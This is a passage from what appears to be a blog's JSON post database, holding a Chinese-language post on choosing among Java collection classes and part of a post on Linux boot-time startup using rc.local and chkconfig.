Map**，每类都有不同的实现，有基于数组实现的，有基于链表实现的，有基于xx树实现的，不同的实现虽在功能上可以相互替代但都有各自的应用场景，如基于数组的实现擅长快速遍历，基于链表的实现擅长随机写，基于树的实现可排序等等。\n\nJDK1.5及以后还添加了很多实用的功能，如ConcurrentMap、CopyOnWriteArray、ListBlockingQueue、BlockingDeque、CopyOnWriteArraySet等等，另外，Collections工具类也提供了很多方便的API，如 synchronizedCollection、binarySearch、checkedCollection、copy、indexOfSubList、reverse、singletonList等等，这给我们提供了非常多的选择。\n\n多线程下使用，需要保证线程安全，读操作远大与写操作，例如缓存系统，使用CopyOnWriteArray...也许会是不错的选择，此外Concurrent...也不错。\n如果在多线程间还需要协作通信等，那么阻塞队列BlockingQueue、BlockingDeque（双端队列，既可以在队列的前端进行插入删除操作，也可以在队列的后端进行插入删除操作，具有队列和栈的特征）会是最合适的选择。\n如果这还不够，可以使用带优先级的PriorityBlockingQueue更秒的地方我们还可以使用DelayQueue延迟队列，如果你的创造力够强的话，用DelayQueue来实现一些超时管理（如Session超时处理、请求超时处理）会有非常优雅和奇妙的效果 。\n\n如果不会涉及多线程并发访问，如方法内部、同步访问区等，如果有随机写的需求可以考虑LinkedList或LinkedHashSet\n如果需要快速检索元素是否已经存在于集合内可以考虑使用HashMap、HashSet\n如果我们需要非常频繁且高效的遍历则应该采用ArrayList\n如果我们需要排序，那么就必需要选择TreeMap、TreeSet喽\n另外，LinkedList同时实现了List、Deque、Queue接口，用其来实现Stack也是可以的。\n\n### 2、《编程思想》相关概念\n![图片5](http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/5.png)\n![图片6](http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/6.png)\n\n#### 3、集合类为什么也称为容器类？\n![图片7](http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/7.png)\n","slug":"Java集合类从属关系","published":1,"updated":"2016-11-17T11:59:42.664Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulb2000ugwtm4ubhlkip","content":"<blockquote>\n<p>&#x6709;&#x4E9B;&#x4E1C;&#x897F;&#x4E0D;&#x6574;&#x7406;&#xFF0C;&#x5B9E;&#x5728;&#x592A;&#x5BB9;&#x6613;&#x5FD8;&#x4E86;&#x3002;</p>\n</blockquote>\n<h3 id=\"1&#x3001;&#x96C6;&#x5408;&#x5173;&#x7CFB;&#x56FE;\"><a href=\"#1&#x3001;&#x96C6;&#x5408;&#x5173;&#x7CFB;&#x56FE;\" class=\"headerlink\" title=\"1&#x3001;&#x96C6;&#x5408;&#x5173;&#x7CFB;&#x56FE;\"></a>1&#x3001;&#x96C6;&#x5408;&#x5173;&#x7CFB;&#x56FE;</h3><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/1.png\" alt=\"&#x56FE;&#x7247;1\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/2.png\" alt=\"&#x56FE;&#x7247;2\"><br><a id=\"more\"></a><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/3.png\" alt=\"&#x56FE;&#x7247;3\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/4.png\" alt=\"&#x56FE;&#x7247;4\"></p>\n<p><strong>Java&#x7684;&#x96C6;&#x5408;&#x5206;&#x4E3A;&#x4E86;&#x56DB;&#x7C7B;&#xFF1A;List Set Queue Map</strong>&#xFF0C;&#x6BCF;&#x7C7B;&#x90FD;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x6709;&#x57FA;&#x4E8E;&#x6570;&#x7EC4;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x6709;&#x57FA;&#x4E8E;&#x94FE;&#x8868;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x6709;&#x57FA;&#x4E8E;xx&#x6811;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5B9E;&#x73B0;&#x867D;&#x5728;&#x529F;&#x80FD;&#x4E0A;&#x53EF;&#x4EE5;&#x76F8;&#x4E92;&#x66FF;&#x4EE3;&#x4F46;&#x90FD;&#x6709;&#x5404;&#x81EA;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;&#xFF0C;&#x5982;&#x57FA;&#x4E8E;&#x6570;&#x7EC4;&#x7684;&#x5B9E;&#x73B0;&#x64C5;&#x957F;&#x5FEB;&#x901F;&#x904D;&#x5386;&#xFF0C;&#x57FA;&#x4E8E;&#x94FE;&#x8868;&#x7684;&#x5B9E;&#x73B0;&#x64C5;&#x957F;&#x968F;&#x673A;&#x5199;&#xFF0C;&#x57FA;&#x4E8E;&#x6811;&#x7684;&#x5B9E;&#x73B0;&#x53EF;&#x6392;&#x5E8F;&#x7B49;&#x7B49;&#x3002;</p>\n<p>JDK1.5&#x53CA;&#x4EE5;&#x540E;&#x8FD8;&#x6DFB;&#x52A0;&#x4E86;&#x5F88;&#x591A;&#x5B9E;&#x7528;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5982;ConcurrentMap&#x3001;CopyOnWriteArray&#x3001;ListBlockingQueue&#x3001;BlockingDeque&#x3001;CopyOnWriteArraySet&#x7B49;&#x7B49;&#xFF0C;&#x53E6;&#x5916;&#xFF0C;Collections&#x5DE5;&#x5177;&#x7C7B;&#x4E5F;&#x63D0;&#x4F9B;&#x4E86;&#x5F88;&#x591A;&#x65B9;&#x4FBF;&#x7684;API&#xFF0C;&#x5982; synchronizedCollection&#x3001;binarySearch&#x3001;checkedCollection&#x3001;copy&#x3001;indexOfSubList&#x3001;reverse&#x3001;singletonList&#x7B49;&#x7B49;&#xFF0C;&#x8FD9;&#x7ED9;&#x6211;&#x4EEC;&#x63D0;&#x4F9B;&#x4E86;&#x975E;&#x5E38;&#x591A;&#x7684;&#x9009;&#x62E9;&#x3002;</p>\n<p>&#x591A;&#x7EBF;&#x7A0B;&#x4E0B;&#x4F7F;&#x7528;&#xFF0C;&#x9700;&#x8981;&#x4FDD;&#x8BC1;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#xFF0C;&#x8BFB;&#x64CD;&#x4F5C;&#x8FDC;&#x5927;&#x4E0E;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x4F8B;&#x5982;&#x7F13;&#x5B58;&#x7CFB;&#x7EDF;&#xFF0C;&#x4F7F;&#x7528;CopyOnWriteArray&#x2026;&#x4E5F;&#x8BB8;&#x4F1A;&#x662F;&#x4E0D;&#x9519;&#x7684;&#x9009;&#x62E9;&#xFF0C;&#x6B64;&#x5916;Concurrent&#x2026;&#x4E5F;&#x4E0D;&#x9519;&#x3002;<br>&#x5982;&#x679C;&#x5728;&#x591A;&#x7EBF;&#x7A0B;&#x95F4;&#x8FD8;&#x9700;&#x8981;&#x534F;&#x4F5C;&#x901A;&#x4FE1;&#x7B49;&#xFF0C;&#x90A3;&#x4E48;&#x963B;&#x585E;&#x961F;&#x5217;BlockingQueue&#x3001;BlockingDeque&#xFF08;&#x53CC;&#x7AEF;&#x961F;&#x5217;&#xFF0C;&#x65E2;&#x53EF;&#x4EE5;&#x5728;&#x961F;&#x5217;&#x7684;&#x524D;&#x7AEF;&#x8FDB;&#x884C;&#x63D2;&#x5165;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x961F;&#x5217;&#x7684;&#x540E;&#x7AEF;&#x8FDB;&#x884C;&#x63D2;&#x5165;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#xFF0C;&#x5177;&#x6709;&#x961F;&#x5217;&#x548C;&#x6808;&#x7684;&#x7279;&#x5F81;&#xFF09;&#x4F1A;&#x662F;&#x6700;&#x5408;&#x9002;&#x7684;&#x9009;&#x62E9;&#x3002;<br>&#x5982;&#x679C;&#x8FD9;&#x8FD8;&#x4E0D;&#x591F;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5E26;&#x4F18;&#x5148;&#x7EA7;&#x7684;PriorityBlockingQueue&#x66F4;&#x79D2;&#x7684;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;DelayQueue&#x5EF6;&#x8FDF;&#x961F;&#x5217;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x7684;&#x521B;&#x9020;&#x529B;&#x591F;&#x5F3A;&#x7684;&#x8BDD;&#xFF0C;&#x7528;DelayQueue&#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E9B;&#x8D85;&#x65F6;&#x7BA1;&#x7406;&#xFF08;&#x5982;Session&#x8D85;&#x65F6;&#x5904;&#x7406;&#x3001;&#x8BF7;&#x6C42;&#x8D85;&#x65F6;&#x5904;&#x7406;&#xFF09;&#x4F1A;&#x6709;&#x975E;&#x5E38;&#x4F18;&#x96C5;&#x548C;&#x5947;&#x5999;&#x7684;&#x6548;&#x679C; &#x3002;</p>\n<p>&#x5982;&#x679C;&#x4E0D;&#x4F1A;&#x6D89;&#x53CA;&#x591A;&#x7EBF;&#x7A0B;&#x5E76;&#x53D1;&#x8BBF;&#x95EE;&#xFF0C;&#x5982;&#x65B9;&#x6CD5;&#x5185;&#x90E8;&#x3001;&#x540C;&#x6B65;&#x8BBF;&#x95EE;&#x533A;&#x7B49;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x968F;&#x673A;&#x5199;&#x7684;&#x9700;&#x6C42;&#x53EF;&#x4EE5;&#x8003;&#x8651;LinkedList&#x6216;LinkedHashSet<br>&#x5982;&#x679C;&#x9700;&#x8981;&#x5FEB;&#x901F;&#x68C0;&#x7D22;&#x5143;&#x7D20;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x4E8E;&#x96C6;&#x5408;&#x5185;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x4F7F;&#x7528;HashMap&#x3001;HashSet<br>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x975E;&#x5E38;&#x9891;&#x7E41;&#x4E14;&#x9AD8;&#x6548;&#x7684;&#x904D;&#x5386;&#x5219;&#x5E94;&#x8BE5;&#x91C7;&#x7528;ArrayList<br>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6392;&#x5E8F;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x5FC5;&#x9700;&#x8981;&#x9009;&#x62E9;TreeMap&#x3001;TreeSet&#x55BD;<br>&#x53E6;&#x5916;&#xFF0C;LinkedList&#x540C;&#x65F6;&#x5B9E;&#x73B0;&#x4E86;List&#x3001;Deque&#x3001;Queue&#x63A5;&#x53E3;&#xFF0C;&#x7528;&#x5176;&#x6765;&#x5B9E;&#x73B0;Stack&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#x3002;</p>\n<h3 id=\"2&#x3001;&#x300A;&#x7F16;&#x7A0B;&#x601D;&#x60F3;&#x300B;&#x76F8;&#x5173;&#x6982;&#x5FF5;\"><a href=\"#2&#x3001;&#x300A;&#x7F16;&#x7A0B;&#x601D;&#x60F3;&#x300B;&#x76F8;&#x5173;&#x6982;&#x5FF5;\" class=\"headerlink\" title=\"2&#x3001;&#x300A;&#x7F16;&#x7A0B;&#x601D;&#x60F3;&#x300B;&#x76F8;&#x5173;&#x6982;&#x5FF5;\"></a>2&#x3001;&#x300A;&#x7F16;&#x7A0B;&#x601D;&#x60F3;&#x300B;&#x76F8;&#x5173;&#x6982;&#x5FF5;</h3><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/5.png\" alt=\"&#x56FE;&#x7247;5\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/6.png\" alt=\"&#x56FE;&#x7247;6\"></p>\n<h4 id=\"3&#x3001;&#x96C6;&#x5408;&#x7C7B;&#x4E3A;&#x4EC0;&#x4E48;&#x4E5F;&#x79F0;&#x4E3A;&#x5BB9;&#x5668;&#x7C7B;&#xFF1F;\"><a href=\"#3&#x3001;&#x96C6;&#x5408;&#x7C7B;&#x4E3A;&#x4EC0;&#x4E48;&#x4E5F;&#x79F0;&#x4E3A;&#x5BB9;&#x5668;&#x7C7B;&#xFF1F;\" class=\"headerlink\" title=\"3&#x3001;&#x96C6;&#x5408;&#x7C7B;&#x4E3A;&#x4EC0;&#x4E48;&#x4E5F;&#x79F0;&#x4E3A;&#x5BB9;&#x5668;&#x7C7B;&#xFF1F;\"></a>3&#x3001;&#x96C6;&#x5408;&#x7C7B;&#x4E3A;&#x4EC0;&#x4E48;&#x4E5F;&#x79F0;&#x4E3A;&#x5BB9;&#x5668;&#x7C7B;&#xFF1F;</h4><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/7.png\" alt=\"&#x56FE;&#x7247;7\"></p>\n","excerpt":"<blockquote>\n<p>&#x6709;&#x4E9B;&#x4E1C;&#x897F;&#x4E0D;&#x6574;&#x7406;&#xFF0C;&#x5B9E;&#x5728;&#x592A;&#x5BB9;&#x6613;&#x5FD8;&#x4E86;&#x3002;</p>\n</blockquote>\n<h3 id=\"1&#x3001;&#x96C6;&#x5408;&#x5173;&#x7CFB;&#x56FE;\"><a href=\"#1&#x3001;&#x96C6;&#x5408;&#x5173;&#x7CFB;&#x56FE;\" class=\"headerlink\" title=\"1&#x3001;&#x96C6;&#x5408;&#x5173;&#x7CFB;&#x56FE;\"></a>1&#x3001;&#x96C6;&#x5408;&#x5173;&#x7CFB;&#x56FE;</h3><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/1.png\" alt=\"&#x56FE;&#x7247;1\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/2.png\" alt=\"&#x56FE;&#x7247;2\"><br></p>","more":"<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/3.png\" alt=\"&#x56FE;&#x7247;3\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/4.png\" alt=\"&#x56FE;&#x7247;4\"><p></p>\n<p><strong>Java&#x7684;&#x96C6;&#x5408;&#x5206;&#x4E3A;&#x4E86;&#x56DB;&#x7C7B;&#xFF1A;List Set Queue Map</strong>&#xFF0C;&#x6BCF;&#x7C7B;&#x90FD;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x6709;&#x57FA;&#x4E8E;&#x6570;&#x7EC4;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x6709;&#x57FA;&#x4E8E;&#x94FE;&#x8868;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x6709;&#x57FA;&#x4E8E;xx&#x6811;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5B9E;&#x73B0;&#x867D;&#x5728;&#x529F;&#x80FD;&#x4E0A;&#x53EF;&#x4EE5;&#x76F8;&#x4E92;&#x66FF;&#x4EE3;&#x4F46;&#x90FD;&#x6709;&#x5404;&#x81EA;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;&#xFF0C;&#x5982;&#x57FA;&#x4E8E;&#x6570;&#x7EC4;&#x7684;&#x5B9E;&#x73B0;&#x64C5;&#x957F;&#x5FEB;&#x901F;&#x904D;&#x5386;&#xFF0C;&#x57FA;&#x4E8E;&#x94FE;&#x8868;&#x7684;&#x5B9E;&#x73B0;&#x64C5;&#x957F;&#x968F;&#x673A;&#x5199;&#xFF0C;&#x57FA;&#x4E8E;&#x6811;&#x7684;&#x5B9E;&#x73B0;&#x53EF;&#x6392;&#x5E8F;&#x7B49;&#x7B49;&#x3002;</p>\n<p>JDK1.5&#x53CA;&#x4EE5;&#x540E;&#x8FD8;&#x6DFB;&#x52A0;&#x4E86;&#x5F88;&#x591A;&#x5B9E;&#x7528;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5982;ConcurrentMap&#x3001;CopyOnWriteArray&#x3001;ListBlockingQueue&#x3001;BlockingDeque&#x3001;CopyOnWriteArraySet&#x7B49;&#x7B49;&#xFF0C;&#x53E6;&#x5916;&#xFF0C;Collections&#x5DE5;&#x5177;&#x7C7B;&#x4E5F;&#x63D0;&#x4F9B;&#x4E86;&#x5F88;&#x591A;&#x65B9;&#x4FBF;&#x7684;API&#xFF0C;&#x5982; synchronizedCollection&#x3001;binarySearch&#x3001;checkedCollection&#x3001;copy&#x3001;indexOfSubList&#x3001;reverse&#x3001;singletonList&#x7B49;&#x7B49;&#xFF0C;&#x8FD9;&#x7ED9;&#x6211;&#x4EEC;&#x63D0;&#x4F9B;&#x4E86;&#x975E;&#x5E38;&#x591A;&#x7684;&#x9009;&#x62E9;&#x3002;</p>\n<p>&#x591A;&#x7EBF;&#x7A0B;&#x4E0B;&#x4F7F;&#x7528;&#xFF0C;&#x9700;&#x8981;&#x4FDD;&#x8BC1;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#xFF0C;&#x8BFB;&#x64CD;&#x4F5C;&#x8FDC;&#x5927;&#x4E0E;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x4F8B;&#x5982;&#x7F13;&#x5B58;&#x7CFB;&#x7EDF;&#xFF0C;&#x4F7F;&#x7528;CopyOnWriteArray&#x2026;&#x4E5F;&#x8BB8;&#x4F1A;&#x662F;&#x4E0D;&#x9519;&#x7684;&#x9009;&#x62E9;&#xFF0C;&#x6B64;&#x5916;Concurrent&#x2026;&#x4E5F;&#x4E0D;&#x9519;&#x3002;<br>&#x5982;&#x679C;&#x5728;&#x591A;&#x7EBF;&#x7A0B;&#x95F4;&#x8FD8;&#x9700;&#x8981;&#x534F;&#x4F5C;&#x901A;&#x4FE1;&#x7B49;&#xFF0C;&#x90A3;&#x4E48;&#x963B;&#x585E;&#x961F;&#x5217;BlockingQueue&#x3001;BlockingDeque&#xFF08;&#x53CC;&#x7AEF;&#x961F;&#x5217;&#xFF0C;&#x65E2;&#x53EF;&#x4EE5;&#x5728;&#x961F;&#x5217;&#x7684;&#x524D;&#x7AEF;&#x8FDB;&#x884C;&#x63D2;&#x5165;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x961F;&#x5217;&#x7684;&#x540E;&#x7AEF;&#x8FDB;&#x884C;&#x63D2;&#x5165;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#xFF0C;&#x5177;&#x6709;&#x961F;&#x5217;&#x548C;&#x6808;&#x7684;&#x7279;&#x5F81;&#xFF09;&#x4F1A;&#x662F;&#x6700;&#x5408;&#x9002;&#x7684;&#x9009;&#x62E9;&#x3002;<br>&#x5982;&#x679C;&#x8FD9;&#x8FD8;&#x4E0D;&#x591F;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5E26;&#x4F18;&#x5148;&#x7EA7;&#x7684;PriorityBlockingQueue&#x66F4;&#x79D2;&#x7684;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;DelayQueue&#x5EF6;&#x8FDF;&#x961F;&#x5217;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x7684;&#x521B;&#x9020;&#x529B;&#x591F;&#x5F3A;&#x7684;&#x8BDD;&#xFF0C;&#x7528;DelayQueue&#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E9B;&#x8D85;&#x65F6;&#x7BA1;&#x7406;&#xFF08;&#x5982;Session&#x8D85;&#x65F6;&#x5904;&#x7406;&#x3001;&#x8BF7;&#x6C42;&#x8D85;&#x65F6;&#x5904;&#x7406;&#xFF09;&#x4F1A;&#x6709;&#x975E;&#x5E38;&#x4F18;&#x96C5;&#x548C;&#x5947;&#x5999;&#x7684;&#x6548;&#x679C; &#x3002;</p>\n<p>&#x5982;&#x679C;&#x4E0D;&#x4F1A;&#x6D89;&#x53CA;&#x591A;&#x7EBF;&#x7A0B;&#x5E76;&#x53D1;&#x8BBF;&#x95EE;&#xFF0C;&#x5982;&#x65B9;&#x6CD5;&#x5185;&#x90E8;&#x3001;&#x540C;&#x6B65;&#x8BBF;&#x95EE;&#x533A;&#x7B49;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x968F;&#x673A;&#x5199;&#x7684;&#x9700;&#x6C42;&#x53EF;&#x4EE5;&#x8003;&#x8651;LinkedList&#x6216;LinkedHashSet<br>&#x5982;&#x679C;&#x9700;&#x8981;&#x5FEB;&#x901F;&#x68C0;&#x7D22;&#x5143;&#x7D20;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x4E8E;&#x96C6;&#x5408;&#x5185;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x4F7F;&#x7528;HashMap&#x3001;HashSet<br>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x975E;&#x5E38;&#x9891;&#x7E41;&#x4E14;&#x9AD8;&#x6548;&#x7684;&#x904D;&#x5386;&#x5219;&#x5E94;&#x8BE5;&#x91C7;&#x7528;ArrayList<br>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6392;&#x5E8F;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x5FC5;&#x9700;&#x8981;&#x9009;&#x62E9;TreeMap&#x3001;TreeSet&#x55BD;<br>&#x53E6;&#x5916;&#xFF0C;LinkedList&#x540C;&#x65F6;&#x5B9E;&#x73B0;&#x4E86;List&#x3001;Deque&#x3001;Queue&#x63A5;&#x53E3;&#xFF0C;&#x7528;&#x5176;&#x6765;&#x5B9E;&#x73B0;Stack&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#x3002;</p>\n<h3 id=\"2&#x3001;&#x300A;&#x7F16;&#x7A0B;&#x601D;&#x60F3;&#x300B;&#x76F8;&#x5173;&#x6982;&#x5FF5;\"><a href=\"#2&#x3001;&#x300A;&#x7F16;&#x7A0B;&#x601D;&#x60F3;&#x300B;&#x76F8;&#x5173;&#x6982;&#x5FF5;\" class=\"headerlink\" title=\"2&#x3001;&#x300A;&#x7F16;&#x7A0B;&#x601D;&#x60F3;&#x300B;&#x76F8;&#x5173;&#x6982;&#x5FF5;\"></a>2&#x3001;&#x300A;&#x7F16;&#x7A0B;&#x601D;&#x60F3;&#x300B;&#x76F8;&#x5173;&#x6982;&#x5FF5;</h3><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/5.png\" alt=\"&#x56FE;&#x7247;5\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/6.png\" alt=\"&#x56FE;&#x7247;6\"></p>\n<h4 id=\"3&#x3001;&#x96C6;&#x5408;&#x7C7B;&#x4E3A;&#x4EC0;&#x4E48;&#x4E5F;&#x79F0;&#x4E3A;&#x5BB9;&#x5668;&#x7C7B;&#xFF1F;\"><a href=\"#3&#x3001;&#x96C6;&#x5408;&#x7C7B;&#x4E3A;&#x4EC0;&#x4E48;&#x4E5F;&#x79F0;&#x4E3A;&#x5BB9;&#x5668;&#x7C7B;&#xFF1F;\" class=\"headerlink\" title=\"3&#x3001;&#x96C6;&#x5408;&#x7C7B;&#x4E3A;&#x4EC0;&#x4E48;&#x4E5F;&#x79F0;&#x4E3A;&#x5BB9;&#x5668;&#x7C7B;&#xFF1F;\"></a>3&#x3001;&#x96C6;&#x5408;&#x7C7B;&#x4E3A;&#x4EC0;&#x4E48;&#x4E5F;&#x79F0;&#x4E3A;&#x5BB9;&#x5668;&#x7C7B;&#xFF1F;</h4><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/7.png\" alt=\"&#x56FE;&#x7247;7\"></p>"},{"title":"Linux开机启动程序详解","date":"2016-09-06T14:41:19.000Z","toc":false,"_content":"\n### init进程\ninit进程是非内核进程中第一个被启动运行的，因此它的进程编号PID的值总是1。init读它的配置文件/etc/inittab，决定需要启动的运行级别(Runlevel)。从根本上说，运行级别规定了整个系统的行为，每个级别(分别由0到6的整数表示)满足特定的目的。如果定义了initdefault级别，这个值就直接被选中，否则需要由用户输入一个代表运行级别的数值。\n输入代表运行级别的数字之后，init根据/etc/inittab文件中的定义执行一个命令脚本程序。缺省的运行级别取决于安装阶段对登录程序的选择：是使用基于文本的，还是使用基于X-Window的登录程序。\nrc命令脚本程序我们已经知道，当运行级别发生改变时，将由/etc/inittab文件定义需要运行哪一个命令脚本程序。这些命令脚本程序负责启动或者停止该运行级别特定的各种服务。由于需要管理的服务数量很多，因此需要使用rc命令脚本程序。其中，最主要的一个是/etc/rc.d/rc，它负责为每一个运行级别按照正确的顺序调用相应的命令脚本程序。我们可以想象，这样一个命令脚本程序很容易变得难以控制！为了防止这类事件的发生，需要使用精心设计的方案。\n\n<!-- more -->\n\n对每一个运行级别来说，在/etc/rc.d子目录中都有一个对应的下级目录。这些运行级别的下级子目录的命名方法是rcX.d，其中的X就是代表运行级别的数字。比如说，运行级别3的全部命令脚本程序都保存在/etc/rc.d/rc3.d子目录中。在各个运行级别的子目录中，都建立有到/etc/rc.d/init.d子目录中命令脚本程序的符号链接，但是，这些符号链接并不使用命令脚本程序在/etc/rc.d/init.d子目录中原来的名字。如果命令脚本程序是用来启动一个服务的，其符号链接的名字就以字母S打头；如果命令脚本程序是用来关闭一个服务的，其符号链接的名字就以字母K打头。\n许多情况下，这些命令脚本程序的执行顺序都很重要。如果没有先配置网络接口，就没有办法使用DNS服务解析主机名！为了安排它们的执行顺序，在字母S或者K的后面紧跟着一个两位数字，数值小的在数值大的前面执行。比如：/etc/rc.d/rc3.d/S50inet就会在/etc/rc.d/rc3.d/S55named之前执行(S50inet配置网络设置，55named启动DNS服务器)。存放在/etc/rc.d/init.d子目录中的、被符号链接上的命令脚本程序是真正的实干家，是它们完成了启动或者停止各种服务的操作过程。当/etc/rc.d/rc运行通过每个特定的运行级别子目录的时候，它会根据数字的顺序依次调用各个命令脚本程序执行。它先运行以字母K打头的命令脚本程序，然后再运行以字母S打头的命令脚本程序。对以字母K打头的命令脚本程序来说，会传递Stop参数；类似地对以字母S打头的命令脚本程序来说，会传递Start参数。编写自己的rc命令脚本在维护Linux系统运转的日子里，肯定会遇到需要系统管理员对开机或者关机命令脚\n本进行修改的情况。\n\n### 一、/etc/rc.d/rc.local\n这是一个最简单的方法，编辑“/etc/rc.d/rc.local(链接地址为/etc/rc.local)”，把启动程序的shell命令输入进去即可，输入命令的全路径，类似于windows下的“启动”。\n\n```bash\n#在centos7中,/etc/rc.d/rc.local文件的权限被降低了,开机的时候执行自己的脚本是不能起动一些服务的,执行下面的命令可以将文件标记为可执行的文件\nchmod +x /etc/rc.d/rc.local\n\nvim /etc/rc.d/rc.local\n\n# 文件最后添加可执行脚本\n/data/run/script/start-service.sh\n\n#在脚本中输入启动服务的命令，如开机启动tomcat\n#!/bin/bash\nexport JDK_HOME=/home/java/jdk1.8.0_91\nexport JAVA_HOME=/home/java/jdk1.8.0_91\n/home/tomcat/apache-tomcat-8.0.36/bin/startup.sh\n\n#赋予执行权限\nchmod +x /data/run/script/start-service.sh\n```\n\n这样，start-service.sh脚本在开机的时候就会被执行了,以后自启动服务可以直接添加在该脚本中。\n\n### 二、chkconfig\n```bash\n# 查看nginx服务启动选项的配置状态\nchkconfig --list | grep nginx\n\n# 0 - 停机\n# 1 - 单用户模式 \n# 2 - 多用户，没有NFS \n# 3 - 完全多用户模式(标准的运行级，命令行模式启动) \n# 4 - 没有用到 \n# 5 - X11(xwindow，图形界面启动) \n# 6 - 重新启动 \n# 运行级别最常用的设置为2,3,5\nnginx   0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:off\n\n#添加系统服务\nchkconfig --add nginx\n\n#删除系统服务\nchkconfig --del 